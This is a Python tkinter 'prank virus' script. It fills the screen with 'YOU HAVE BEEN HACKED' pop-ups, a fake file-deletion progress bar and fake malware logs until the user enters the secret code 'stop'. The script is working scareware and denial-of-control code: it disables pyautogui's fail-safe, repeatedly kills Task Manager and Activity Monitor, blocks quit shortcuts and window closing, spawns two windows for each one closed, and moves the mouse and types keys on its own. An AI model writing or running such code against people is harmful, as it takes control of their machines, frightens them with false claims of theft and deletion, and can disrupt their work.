import tkinter as tk
from tkinter import messagebox, Label, Button, Entry, Frame, Canvas, PhotoImage
import random
import threading
import time
import pyautogui
import string
import os
import psutil
import platform
import webbrowser
import pygame
import math
import base64
import sys
from io import BytesIO

# Try to import PIL, but provide fallback if not available
try:
    from PIL import Image, ImageTk
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

# Disable fail-safe
pyautogui.FAILSAFE = False

# Determine OS
SYSTEM = platform.system()

# Secret code options
SECRET_CODE = "stop"
windows_list = []
balls_list = []
is_running = True
difficulty_level = 1
score = 0
start_time = time.time()
fake_progress = 0
sound_enabled = True
window_collision_enabled = True
screen_flash_enabled = True
glitch_effect_enabled = True
popup_frequency = 1.0  # Base frequency multiplier
last_popup_time = time.time()

def prevent_cmd_q():
    """Prevent macOS cmd+q from quitting the application"""
    if SYSTEM == "Darwin":  # macOS
        def cmd_q_handler(event):
            messagebox.showinfo("Nice Try!", "Command+Q won't work! You can't escape!")
            return "break"  # Prevent the default behavior

        # Apply to all existing windows
        for window in windows_list:
            try:
                window.bind('<Command-q>', cmd_q_handler)
                window.bind('<Command-Q>', cmd_q_handler)
                window.bind('<Command-w>', cmd_q_handler)
                window.bind('<Command-W>', cmd_q_handler)
                window.createcommand('exit', lambda: None)  # Block exit command
            except:
                pass

        # Continuously check for new windows and apply the binding
        def monitor_windows():
            while is_running:
                for window in windows_list:
                    try:
                        window.bind('<Command-q>', cmd_q_handler)
                        window.bind('<Command-Q>', cmd_q_handler)
                        window.bind('<Command-w>', cmd_q_handler)
                        window.bind('<Command-W>', cmd_q_handler)
                        window.createcommand('exit', lambda: None)
                    except:
                        pass
                time.sleep(0.5)

        # Start monitoring thread
        monitor_thread = threading.Thread(target=monitor_windows)
        monitor_thread.daemon = True
        monitor_thread.start()

def hide_console():
    """Hide the console window"""
    if SYSTEM == "Windows":
        import ctypes
        kernel32 = ctypes.WinDLL('kernel32')
        user32 = ctypes.WinDLL('user32')
        get_console_window = kernel32.GetConsoleWindow
        show_window = user32.ShowWindow
        hwnd = get_console_window()
        if hwnd:
            show_window(hwnd, 0)  # SW_HIDE = 0
    # On macOS, the console window is handled differently and doesn't need explicit hiding

def protect_process():
    """Protect the process from being terminated"""
    while is_running:
        try:
            current_pid = os.getpid()
            current_process = psutil.Process(current_pid)
            current_process.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS)
            time.sleep(1)
        except:
            pass

def prevent_task_manager():
    """Prevent Task Manager/Activity Monitor from being opened"""
    while is_running:
        try:
            if SYSTEM == "Windows":
                os.system('taskkill /f /im taskmgr.exe >nul 2>&1')
            elif SYSTEM == "Darwin":  # macOS
                os.system('pkill "Activity Monitor" 2>/dev/null')
            time.sleep(0.5)
        except:
            pass

class Ball:
    """Class representing a bouncing ball"""
    def __init__(self, canvas, color="red", size=20):
        self.canvas = canvas
        self.size = size
        self.x = random.randint(0, 800)
        self.y = random.randint(0, 600)
        self.dx = random.choice([-5, -4, -3, 3, 4, 5])
        self.dy = random.choice([-5, -4, -3, 3, 4, 5])
        self.ball = canvas.create_oval(self.x, self.y, self.x + size, self.y + size, fill=color, outline="white")
        self.parent_window = None  # Store reference to parent window

    def move(self):
        self.canvas.move(self.ball, self.dx, self.dy)
        pos = self.canvas.coords(self.ball)
        if pos[0] <= 0 or pos[2] >= self.canvas.winfo_width():
            self.dx = -self.dx
        if pos[1] <= 0 or pos[3] >= self.canvas.winfo_height():
            self.dy = -self.dy

        # Check for collisions with other windows
        if self.parent_window:
            self.check_window_collisions(pos)

        # Return current position for collision detection
        return (pos[0], pos[1], pos[2], pos[3])

    def check_window_collisions(self, ball_pos):
        """Check if ball collides with other windows"""
        global windows_list

        if not self.parent_window:
            return

        try:
            # Get ball's absolute screen position
            parent_x = self.parent_window.winfo_x()
            parent_y = self.parent_window.winfo_y()

            ball_screen_x1 = parent_x + ball_pos[0]
            ball_screen_y1 = parent_y + ball_pos[1]
            ball_screen_x2 = parent_x + ball_pos[2]
            ball_screen_y2 = parent_y + ball_pos[3]

            # Check collision with each window
            for window in windows_list:
                if window == self.parent_window:
                    continue

                try:
                    win_x = window.winfo_x()
                    win_y = window.winfo_y()
                    win_width = window.winfo_width()
                    win_height = window.winfo_height()

                    # Check for collision
                    if (ball_screen_x2 >= win_x and ball_screen_x1 <= win_x + win_width and
                        ball_screen_y2 >= win_y and ball_screen_y1 <= win_y + win_height):

                        # Determine which side was hit and bounce
                        if abs(ball_screen_x2 - win_x) < 10 or abs(ball_screen_x1 - (win_x + win_width)) < 10:
                            self.dx = -self.dx
                        if abs(ball_screen_y2 - win_y) < 10 or abs(ball_screen_y1 - (win_y + win_height)) < 10:
                            self.dy = -self.dy

                        # Play sound and create visual effect
                        play_sound("collision")
                        if random.random() < 0.3:
                            create_screen_flash()

                        # Sometimes move the hit window
                        if random.random() < 0.4:
                            new_x = win_x + random.randint(-20, 20)
                            new_y = win_y + random.randint(-20, 20)
                            window.geometry(f"+{new_x}+{new_y}")

                        # Only handle one collision at a time
                        return
                except:
                    continue
        except:
            pass

def play_sound(sound_type):
    """Play a sound effect"""
    if sound_enabled:
        try:
            pygame.mixer.init()
            if sound_type == "collision":
                pygame.mixer.Sound("collision.wav").play()
            elif sound_type == "alert":
                pygame.mixer.Sound("alert.wav").play()
        except:
            pass  # Silently fail if sound can't be played

def increase_difficulty():
    """Increase the difficulty level over time"""
    global difficulty_level, is_running
    while is_running:
        time.sleep(30)  # Increase difficulty every 30 seconds
        if is_running:
            difficulty_level += 1
            # Create more windows based on difficulty
            for _ in range(difficulty_level):
                if random.random() < 0.7:  # 70% chance
                    create_hacked_window()

def fake_file_deletion():
    """Show a fake file deletion progress"""
    global fake_progress, is_running

    deletion_window = tk.Toplevel()
    deletion_window.title("⚠️ DELETING FILES ⚠️")
    deletion_window.geometry("400x200")
    deletion_window.configure(bg="black")
    windows_list.append(deletion_window)

    title = Label(deletion_window, text="DELETING YOUR FILES", font=("Impact", 16), fg="red", bg="black")
    title.pack(pady=10)

    progress_label = Label(deletion_window, text="Progress: 0%", fg="white", bg="black")
    progress_label.pack(pady=5)

    file_label = Label(deletion_window, text="Currently deleting: ", fg="white", bg="black")
    file_label.pack(pady=5)

    progress_bar = Frame(deletion_window, bg="red", height=20, width=0)
    progress_bar.pack(fill="x", padx=20, pady=10)

    fake_files = [
        "Documents/Personal/financial_records.xlsx",
        "Pictures/Family/vacation2023.jpg",
        "Documents/Work/project_plans.docx",
        "Downloads/bank_statements.pdf",
        "Desktop/passwords.txt",
        "Users/AppData/Local/Google/Chrome/User Data/Default/Cookies",
        "Library/Application Support/Passwords.db",
        "System32/drivers/critical.sys"
    ]

    def update_progress():
        global fake_progress, is_running
        if not is_running:
            deletion_window.destroy()
            return

        fake_progress += random.randint(1, 5)
        if fake_progress > 100:
            fake_progress = 100

        progress_label.config(text=f"Progress: {fake_progress}%")
        progress_bar.config(width=int(380 * (fake_progress/100)))
        file_label.config(text=f"Currently deleting: {random.choice(fake_files)}")

        if fake_progress < 100 and is_running:
            deletion_window.after(random.randint(500, 2000), update_progress)
        elif fake_progress >= 100 and is_running:
            file_label.config(text="Deletion complete! Your files are gone!")

    update_progress()
    deletion_window.protocol("WM_DELETE_WINDOW", lambda: None)  # Prevent closing

def open_random_websites():
    """Open random websites in the browser"""
    global is_running

    harmless_sites = [
        "https://www.wikipedia.org",
        "https://www.weather.com",
        "https://www.nytimes.com",
        "https://www.reddit.com",
        "https://www.youtube.com"
    ]

    while is_running:
        if random.random() < 0.3:  # 30% chance to open a website
            try:
                webbrowser.open(random.choice(harmless_sites))
            except:
                pass
        time.sleep(random.randint(20, 60))  # Wait between 20-60 seconds

def create_bouncing_balls_window():
    """Create a window with bouncing balls"""
    global balls_list, is_running

    ball_window = tk.Toplevel()
    ball_window.title("⚠️ VIRUS PARTICLES ⚠️")
    ball_window.geometry("400x300+200+200")
    ball_window.configure(bg="black")
    windows_list.append(ball_window)

    canvas = Canvas(ball_window, width=400, height=300, bg="black", highlightthickness=0)
    canvas.pack(fill="both", expand=True)

    # Create balls
    num_balls = random.randint(3, 8)
    window_balls = []

    for _ in range(num_balls):
        color = random.choice(["red", "orange", "yellow", "green", "cyan", "magenta"])
        size = random.randint(10, 30)
        ball = Ball(canvas, color, size)
        ball.parent_window = ball_window  # Set parent window reference
        window_balls.append(ball)
        balls_list.append((ball, ball_window))

    def update_balls():
        if not is_running:
            return

        for ball in window_balls:
            ball.move()

        ball_window.after(30, update_balls)

    update_balls()
    ball_window.protocol("WM_DELETE_WINDOW", lambda: multiply_windows(ball_window))

def handle_window_collisions():
    """Handle collisions between windows"""
    global windows_list, is_running, window_collision_enabled

    while is_running and window_collision_enabled:
        # Check each pair of windows for collision
        for i in range(len(windows_list)):
            if i >= len(windows_list):  # Check if window still exists
                continue

            window1 = windows_list[i]

            try:
                # Get window1 position and size
                w1_geo = window1.winfo_geometry()
                w1_parts = w1_geo.split('+')
                w1_size = w1_parts[0].split('x')
                w1_x = int(w1_parts[1])
                w1_y = int(w1_parts[2])
                w1_width = int(w1_size[0])
                w1_height = int(w1_size[1])

                # Check collision with other windows
                for j in range(i+1, len(windows_list)):
                    if j >= len(windows_list):  # Check if window still exists
                        continue

                    window2 = windows_list[j]

                    try:
                        # Get window2 position and size
                        w2_geo = window2.winfo_geometry()
                        w2_parts = w2_geo.split('+')
                        w2_size = w2_parts[0].split('x')
                        w2_x = int(w2_parts[1])
                        w2_y = int(w2_parts[2])
                        w2_width = int(w2_size[0])
                        w2_height = int(w2_size[1])

                        # Check for collision
                        if (w1_x < w2_x + w2_width and w1_x + w1_width > w2_x and
                            w1_y < w2_y + w2_height and w1_y + w1_height > w2_y):

                            # Calculate new positions (simple bounce)
                            dx1 = random.randint(10, 30) * random.choice([-1, 1])
                            dy1 = random.randint(10, 30) * random.choice([-1, 1])
                            dx2 = random.randint(10, 30) * random.choice([-1, 1])
                            dy2 = random.randint(10, 30) * random.choice([-1, 1])

                            # Move windows
                            new_x1 = max(0, min(window1.winfo_screenwidth() - w1_width, w1_x + dx1))
                            new_y1 = max(0, min(window1.winfo_screenheight() - w1_height, w1_y + dy1))
                            new_x2 = max(0, min(window2.winfo_screenwidth() - w2_width, w2_x + dx2))
                            new_y2 = max(0, min(window2.winfo_screenheight() - w2_height, w2_y + dy2))

                            window1.geometry(f"+{new_x1}+{new_y1}")
                            window2.geometry(f"+{new_x2}+{new_y2}")

                            play_sound("collision")
                    except:
                        continue
            except:
                continue

        time.sleep(0.1)  # Check for collisions every 100ms

def create_screen_flash():
    """Create a full-screen flash effect"""
    if not screen_flash_enabled or not is_running:
        return

    flash_window = tk.Toplevel()
    flash_window.attributes('-fullscreen', True)
    flash_window.attributes('-topmost', True)
    flash_window.configure(bg=random.choice(["red", "orange", "yellow"]))
    flash_window.attributes('-alpha', 0.3)  # Semi-transparent

    # Close after a short time
    flash_window.after(150, flash_window.destroy)

    # Schedule next flash with random interval
    if is_running:
        root.after(random.randint(5000, 15000), create_screen_flash)

def create_glitch_effect():
    """Create a glitchy screen effect"""
    if not glitch_effect_enabled or not is_running:
        return

    glitch_window = tk.Toplevel()
    screen_width = glitch_window.winfo_screenwidth()
    screen_height = glitch_window.winfo_screenheight()

    # Random position and size for glitch effect
    width = random.randint(100, screen_width//2)
    height = random.randint(50, screen_height//2)
    x = random.randint(0, screen_width - width)
    y = random.randint(0, screen_height - height)

    glitch_window.geometry(f"{width}x{height}+{x}+{y}")
    glitch_window.overrideredirect(True)  # No window decorations
    glitch_window.attributes('-topmost', True)
    glitch_window.attributes('-alpha', random.uniform(0.3, 0.7))

    # Random color
    glitch_window.configure(bg=random.choice(["blue", "green", "cyan", "magenta"]))

    # Close after a short time
    glitch_window.after(random.randint(100, 500), glitch_window.destroy)

    # Schedule next glitch with random interval
    if is_running:
        root.after(random.randint(2000, 8000), create_glitch_effect)

def create_hacked_window():
    """Create a window that says 'You have been hacked!'"""
    global last_popup_time, popup_frequency

    # Control popup frequency based on difficulty
    current_time = time.time()
    if current_time - last_popup_time < (3.0 / (popup_frequency * difficulty_level)):
        return

    last_popup_time = current_time

    hack_window = tk.Toplevel()
    windows_list.append(hack_window)

    width = random.randint(200, 500)
    height = random.randint(150, 350)
    screen_width = hack_window.winfo_screenwidth()
    screen_height = hack_window.winfo_screenheight()
    x = random.randint(0, screen_width - width)
    y = random.randint(0, screen_height - height)

    # Store velocity for window movement
    hack_window.vx = random.choice([-3, -2, -1, 1, 2, 3])
    hack_window.vy = random.choice([-3, -2, -1, 1, 2, 3])

    hack_window.geometry(f"{width}x{height}+{x}+{y}")
    hack_window.title("⚠️ SECURITY ALERT ⚠️")
    hack_window.configure(bg="black")

    # Add transparency effect to some windows
    if random.random() < 0.3:
        hack_window.attributes('-alpha', random.uniform(0.7, 0.9))

    # Flashing text color
    colors = ['red', 'orange', 'yellow']
    label = Label(hack_window, text="YOU HAVE BEEN HACKED!",
                  font=("Impact", 18, "bold"), fg=random.choice(colors), bg="black")
    label.pack(pady=20)

    # Add skull image to some windows if PIL is available
    if random.random() < 0.4 and PIL_AVAILABLE:
        try:
            # Create a simple skull image using PIL
            img = Image.new('RGBA', (100, 100), (0, 0, 0, 0))
            # This would normally load an image, but we're creating a placeholder
            skull_img = ImageTk.PhotoImage(img)
            skull_label = Label(hack_window, image=skull_img, bg="black")
            skull_label.image = skull_img  # Keep a reference
            skull_label.pack(pady=5)
        except:
            # Fallback to emoji if image creation fails
            emoji_label = Label(hack_window, text="😈 👾 💀", font=("Arial", 30), bg="black")
            emoji_label.pack(pady=10)
    else:
        # Always use emoji if PIL is not available
        emoji_label = Label(hack_window, text="😈 👾 💀", font=("Arial", 30), bg="black")
        emoji_label.pack(pady=10)

    messages = [
        "All your files are belong to us!",
        "Your computer is mine now!",
        "Say goodbye to your data!",
        "Mining cryptocurrency on your PC now...",
        "Uploading your secrets to the dark web...",
        "Encrypting your drive with ransomware...",
        "Your webcam footage is being streamed...",
        "Your passwords have been harvested!",
        "Deleting system32 folder...",
        "Formatting your hard drive...",
        "Backdoor installed successfully!",
        "Your browser history has been published!",
        "Bank accounts compromised!",
        "Social media accounts hacked!",
        "Biometric data stolen!",
        "Task failed successfully!"
    ]

    sub_label = Label(hack_window, text=random.choice(messages),
                      font=("Arial", 12), fg="white", bg="black")
    sub_label.pack(pady=10)

    code_entry = Entry(hack_window, show="*")
    code_entry.pack(pady=10)

    check_button = Button(hack_window, text="Try to Stop Me!", bg="red", fg="white",
                          command=lambda: check_secret_code(code_entry.get(), hack_window))
    check_button.pack(pady=10)

    # Add a countdown timer to some windows
    if random.random() < 0.3:  # 30% chance
        countdown_var = tk.StringVar()
        countdown_seconds = random.randint(30, 90)  # Random countdown time
        countdown_var.set(f"Time remaining: {countdown_seconds}s")
        countdown_label = Label(hack_window, textvariable=countdown_var, fg="white", bg="black")
        countdown_label.pack(pady=5)

        def update_countdown(seconds_left):
            if seconds_left > 0 and is_running:
                countdown_var.set(f"Time remaining: {seconds_left}s")
                hack_window.after(1000, update_countdown, seconds_left - 1)
            elif is_running:
                countdown_var.set("TIME'S UP! CONSEQUENCES INITIATED!")
                create_hacked_window()  # Create a new window as punishment
                if random.random() < 0.5:
                    create_screen_flash()  # Add a flash effect as punishment

        update_countdown(countdown_seconds)

    def color_flash():
        label.config(fg=random.choice(['red', 'orange', 'yellow']))
        if is_running:
            hack_window.after(500, color_flash)

    def window_shake():
        if not is_running:
            return

        dx = random.randint(-10, 10)
        dy = random.randint(-10, 10)
        hack_window.geometry(f"+{x+dx}+{y+dy}")
        hack_window.after(100, window_shake)

    def move_window():
        if not is_running:
            return

        try:
            # Get current position
            geo = hack_window.winfo_geometry()
            parts = geo.split('+')
            size = parts[0].split('x')
            curr_x = int(parts[1])
            curr_y = int(parts[2])
            curr_width = int(size[0])
            curr_height = int(size[1])

            # Calculate new position
            new_x = curr_x + hack_window.vx
            new_y = curr_y + hack_window.vy

            # Check for screen boundaries
            screen_width = hack_window.winfo_screenwidth()
            screen_height = hack_window.winfo_screenheight()

            if new_x <= 0 or new_x + curr_width >= screen_width:
                hack_window.vx = -hack_window.vx
                new_x = max(0, min(screen_width - curr_width, new_x))
                if random.random() < 0.2:  # 20% chance to play sound on bounce
                    play_sound("collision")

            if new_y <= 0 or new_y + curr_height >= screen_height:
                hack_window.vy = -hack_window.vy
                new_y = max(0, min(screen_height - curr_height, new_y))
                if random.random() < 0.2:  # 20% chance to play sound on bounce
                    play_sound("collision")

            # Move window
            hack_window.geometry(f"+{new_x}+{new_y}")

            # Schedule next move
            hack_window.after(50, move_window)
        except:
            pass

    # Choose behavior randomly with weighted probabilities
    behavior_choices = ["shake", "move", "both"]
    behavior_weights = [0.2, 0.3, 0.5]  # 20% shake, 30% move, 50% both
    behavior = random.choices(behavior_choices, weights=behavior_weights, k=1)[0]

    if behavior == "shake":
        window_shake()
    elif behavior == "move":
        move_window()
    else:  # both
        window_shake()
        move_window()

    # Start the flashing
    color_flash()

    # Override close button
    hack_window.protocol("WM_DELETE_WINDOW", lambda: multiply_windows(hack_window))

    # Prevent cmd+q on macOS
    if SYSTEM == "Darwin":
        hack_window.bind('<Command-q>', lambda e: "break")
        hack_window.bind('<Command-Q>', lambda e: "break")
        hack_window.bind('<Command-w>', lambda e: "break")
        hack_window.bind('<Command-W>', lambda e: "break")

def multiply_windows(window):
    """When a window is closed, create two more"""
    if window in windows_list:
        windows_list.remove(window)
        window.destroy()

    if is_running:
        messagebox.showinfo("Nice Try!", "You can't escape that easily! HAHAHA!")
        # Create two more windows
        for _ in range(2):
            create_hacked_window()

def move_mouse_randomly():
    """Move the mouse cursor randomly"""
    while is_running:
        screen_width, screen_height = pyautogui.size()
        x = random.randint(0, screen_width)
        y = random.randint(0, screen_height)
        pyautogui.moveTo(x, y, duration=random.uniform(0.1, 0.3))
        time.sleep(random.uniform(0.1, 0.3))

def type_random_keys():
    """Type random keys on the keyboard"""
    while is_running:
        random_chars = random.choices(string.ascii_letters + string.digits + "!@#$%^&*()", k=random.randint(1, 3))
        for char in random_chars:
            if not is_running:
                break
            pyautogui.press(char)
            time.sleep(random.uniform(1.5, 3.0))

def check_secret_code(code, window):
    """Check if the secret code is valid"""
    global is_running, score

    if code.lower() == SECRET_CODE:
        elapsed_time = int(time.time() - start_time)
        final_score = max(0, 1000 - (elapsed_time * 5) - (difficulty_level * 50))

        messagebox.showinfo("VICTORY!", f"Congratulations! You found the secret code!\n"
                           f"Time survived: {elapsed_time} seconds\n"
                           f"Difficulty reached: {difficulty_level}\n"
                           f"Final score: {final_score}\n"
                           f"All chaos will now stop.")
        is_running = False
        for w in windows_list[:]:
            try:
                w.destroy()
            except:
                pass
        root.destroy()
    else:
        messagebox.showerror("WRONG CODE", "That's not the secret code! MORE CHAOS FOR YOU!")
        score -= 50  # Penalty for wrong guess

        # Increase punishment based on difficulty
        for _ in range(random.randint(1, difficulty_level + 2)):
            if random.random() < 0.7:
                create_hacked_window()
            else:
                create_bouncing_balls_window()

def create_matrix_effect_window():
    """Create a window with Matrix-like falling code effect"""
    matrix_window = tk.Toplevel()
    matrix_window.title("SYSTEM COMPROMISED")
    matrix_window.geometry(f"300x400+{random.randint(0, 800)}+{random.randint(0, 400)}")
    matrix_window.configure(bg="black")
    windows_list.append(matrix_window)

    canvas = Canvas(matrix_window, bg="black", highlightthickness=0)
    canvas.pack(fill="both", expand=True)

    characters = "01010101010101010101010101010101"

    # Create text items
    text_items = []
    for i in range(30):
        x = random.randint(10, 290)
        text = canvas.create_text(x, -20, text=characters, fill="green", font=("Courier", 10))
        speed = random.uniform(1, 5)
        text_items.append((text, speed))

    def animate_matrix():
        if not is_running:
            return

        for i, (text, speed) in enumerate(text_items):
            canvas.move(text, 0, speed)
            y = canvas.coords(text)[1]

            if y > 420:
                canvas.coords(text, random.randint(10, 290), -20)

            # Randomly change text
            if random.random() < 0.1:
                canvas.itemconfig(text, text="".join(random.choice("01") for _ in range(32)))

        matrix_window.after(50, animate_matrix)

    animate_matrix()
    matrix_window.protocol("WM_DELETE_WINDOW", lambda: multiply_windows(matrix_window))

def create_system_monitor_window():
    """Create a fake system monitor window showing 'virus' activity"""
    monitor_window = tk.Toplevel()
    monitor_window.title("⚠️ SYSTEM MONITOR ⚠️")
    monitor_window.geometry(f"500x300+{random.randint(0, 700)}+{random.randint(0, 400)}")
    monitor_window.configure(bg="black")
    windows_list.append(monitor_window)

    title = Label(monitor_window, text="SYSTEM RESOURCES HIJACKED", font=("Impact", 16), fg="red", bg="black")
    title.pack(pady=10)

    # CPU usage
    cpu_frame = Frame(monitor_window, bg="black")
    cpu_frame.pack(fill="x", padx=20, pady=5)

    cpu_label = Label(cpu_frame, text="CPU Usage:", fg="white", bg="black", width=15, anchor="w")
    cpu_label.pack(side="left")

    cpu_bar = Frame(cpu_frame, bg="red", height=20, width=0)
    cpu_bar.pack(side="left", fill="x", expand=True)

    cpu_percent = Label(cpu_frame, text="0%", fg="white", bg="black", width=5)
    cpu_percent.pack(side="right")

    # Memory usage
    mem_frame = Frame(monitor_window, bg="black")
    mem_frame.pack(fill="x", padx=20, pady=5)

    mem_label = Label(mem_frame, text="Memory Usage:", fg="white", bg="black", width=15, anchor="w")
    mem_label.pack(side="left")

    mem_bar = Frame(mem_frame, bg="red", height=20, width=0)
    mem_bar.pack(side="left", fill="x", expand=True)

    mem_percent = Label(mem_frame, text="0%", fg="white", bg="black", width=5)
    mem_percent.pack(side="right")

    # Network usage
    net_frame = Frame(monitor_window, bg="black")
    net_frame.pack(fill="x", padx=20, pady=5)

    net_label = Label(net_frame, text="Network Usage:", fg="white", bg="black", width=15, anchor="w")
    net_label.pack(side="left")

    net_bar = Frame(net_frame, bg="red", height=20, width=0)
    net_bar.pack(side="left", fill="x", expand=True)

    net_percent = Label(net_frame, text="0%", fg="white", bg="black", width=5)
    net_percent.pack(side="right")

    # Activity log
    log_frame = Frame(monitor_window, bg="black", padx=20, pady=10)
    log_frame.pack(fill="both", expand=True)

    log_label = Label(log_frame, text="Malicious Activity Log:", fg="white", bg="black", anchor="w")
    log_label.pack(anchor="w")

    log_text = Label(log_frame, text="", fg="yellow", bg="black", justify="left", anchor="w")
    log_text.pack(fill="both", expand=True)

    activities = [
        "Scanning system files...",
        "Injecting malicious code...",
        "Disabling security...",
        "Stealing passwords...",
        "Uploading data to remote server...",
        "Installing rootkit...",
        "Modifying registry...",
        "Establishing backdoor connection...",
        "Encrypting user files...",
        "Deploying ransomware payload..."
    ]

    def update_monitor():
        if not is_running:
            return

        # Update CPU
        cpu_val = random.randint(70, 100)
        cpu_bar.config(width=int(350 * (cpu_val/100)))
        cpu_percent.config(text=f"{cpu_val}%")

        # Update Memory
        mem_val = random.randint(60, 95)
        mem_bar.config(width=int(350 * (mem_val/100)))
        mem_percent.config(text=f"{mem_val}%")

        # Update Network
        net_val = random.randint(50, 100)
        net_bar.config(width=int(350 * (net_val/100)))
        net_percent.config(text=f"{net_val}%")

        # Update activity log
        if random.random() < 0.3:  # 30% chance to add new activity
            log_text.config(text=random.choice(activities))

        monitor_window.after(random.randint(500, 1500), update_monitor)

    update_monitor()
    monitor_window.protocol("WM_DELETE_WINDOW", lambda: multiply_windows(monitor_window))

# Main application window
root = tk.Tk()
root.title("⚠️ SYSTEM WARNING ⚠️")
root.geometry("600x400")
root.configure(bg="black")
windows_list.append(root)

# Prevent closing the main window
root.protocol("WM_DELETE_WINDOW", lambda: multiply_windows(root))

# Main window content
main_label = Label(root, text="YOUR SYSTEM IS INFECTED!", font=("Impact", 24), fg="red", bg="black")
main_label.pack(pady=20)

warning_label = Label(root, text="A dangerous virus has been detected on your system.",
                     font=("Arial", 14), fg="white", bg="black")
warning_label.pack(pady=10)

# Add a hint about the secret code
hint_label = Label(root, text="Hint: To stop this chaos, find the secret code.\nIt's a simple 4-letter word meaning 'cease'.",
                  font=("Arial", 10), fg="yellow", bg="black")
hint_label.pack(pady=20)

# Secret code entry
code_frame = Frame(root, bg="black")
code_frame.pack(pady=10)

code_label = Label(code_frame, text="Enter Secret Code:", fg="white", bg="black")
code_label.pack(side="left", padx=5)

code_entry = Entry(code_frame, show="*")
code_entry.pack(side="left", padx=5)

code_button = Button(code_frame, text="Submit", bg="red", fg="white",
                    command=lambda: check_secret_code(code_entry.get(), root))
code_button.pack(side="left", padx=5)

# Start background threads
hide_console()
prevent_cmd_q()

# Start various chaos threads
threads = []

# Create initial windows
for _ in range(3):
    create_hacked_window()

create_matrix_effect_window()
create_system_monitor_window()
fake_file_deletion()

# Start background threads
threads.append(threading.Thread(target=increase_difficulty, daemon=True))
threads.append(threading.Thread(target=handle_window_collisions, daemon=True))
threads.append(threading.Thread(target=protect_process, daemon=True))
threads.append(threading.Thread(target=prevent_task_manager, daemon=True))

# Start mouse/keyboard chaos with lower probability

threads.append(threading.Thread(target=move_mouse_randomly, daemon=True))

threads.append(threading.Thread(target=type_random_keys, daemon=True))

threads.append(threading.Thread(target=open_random_websites, daemon=True))

# Start all threads
for thread in threads:
    thread.start()

# Main loop
root.mainloop()
